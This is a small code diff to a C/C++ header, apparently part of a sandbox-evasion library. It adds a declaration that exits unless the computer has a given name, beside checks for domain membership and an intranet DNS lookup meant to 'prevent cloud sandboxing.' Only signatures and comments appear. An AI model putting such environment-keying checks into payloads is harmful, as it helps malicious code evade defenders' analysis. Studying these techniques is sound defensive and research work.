@@ -38,6 +38,12 @@ namespace sandboxDetection {
 	void  requireJoinedToDomain(char* domain);
 
 	/// <summary>
+	/// Require that the computer has the specified name. Calls exit(0) if check fails.
+	/// </summary>
+	/// <param name="computerName">The computer name to match against</param>
+	void requireComputerName(char* computerName);
+
+	/// <summary>
 	/// NOT IMPLEMENTED Require that a certain domain name (A record) be resolvable. Great for intranet domain names to prevent cloud sandboxing. Calls exit(0) if check fails.
 	/// </summary>
 	/// <param name="domain">The domain name to attempt to resolve</param>
